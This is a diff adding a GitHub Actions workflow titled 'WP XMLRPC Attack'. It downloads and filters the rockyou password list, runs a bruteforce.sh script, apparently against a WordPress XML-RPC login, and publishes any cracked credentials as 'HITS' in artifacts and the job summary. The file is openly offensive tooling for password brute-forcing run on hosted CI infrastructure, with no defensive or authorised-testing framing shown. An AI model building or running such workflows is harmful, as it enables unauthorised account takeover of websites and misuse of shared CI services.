@@ -1,0 +1,79 @@
+name: WP XMLRPC Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      phase:
+        description: 'Phase to run'
+        required: true
+        default: 'all'
+        type: choice
+        options:
+          - all
+          - targeted
+          - rockyou
+
+jobs:
+  bruteforce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Download rockyou
+        if: inputs.phase == 'all' || inputs.phase == 'rockyou'
+        continue-on-error: true
+        run: |
+          curl -sL "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/rockyou.txt.tar.gz" -o rockyou.tar.gz
+          if [ -f rockyou.tar.gz ] && [ -s rockyou.tar.gz ]; then
+            tar -xzf rockyou.tar.gz 2>/dev/null || true
+            [ -f rockyou.txt ] && mv rockyou.txt rockyou_filtered.txt
+          fi
+          if [ ! -f rockyou_filtered.txt ]; then
+            curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/rockyou.txt" -o rockyou_filtered.txt
+          fi
+          if [ -f rockyou_filtered.txt ] && [ -s rockyou_filtered.txt ]; then
+            grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' rockyou_filtered.txt | head -50000 > rockyou_filtered_tmp.txt
+            mv rockyou_filtered_tmp.txt rockyou_filtered.txt
+            echo "Rockyou ready: $(wc -l < rockyou_filtered.txt) passwords"
+          else
+            echo "WARNING: rockyou download failed"
+          fi
+
+      - name: Run Brute Force
+        continue-on-error: true
+        run: |
+          chmod +x bruteforce.sh
+          bash bruteforce.sh
+        env:
+          PHASE: ${{ inputs.phase }}
+
+      - name: Upload Results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: results-${{ github.run_id }}
+          path: |
+            results.txt
+            bruteforce.log
+          retention-days: 30
+          if-no-files-found: ignore
+
+      - name: Summary
+        if: always()
+        run: |
+          echo "## Brute Force Results" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          if [ -f results.txt ] && [ -s results.txt ]; then
+            echo "### HITS:" >> $GITHUB_STEP_SUMMARY
+            cat results.txt >> $GITHUB_STEP_SUMMARY
+          else
+            echo "No credentials found." >> $GITHUB_STEP_SUMMARY
+          fi
+          echo "" >> $GITHUB_STEP_SUMMARY
+          if [ -f bruteforce.log ]; then
+            echo "### Log (last 30 lines):" >> $GITHUB_STEP_SUMMARY
+            tail -30 bruteforce.log >> $GITHUB_STEP_SUMMARY
+          fi
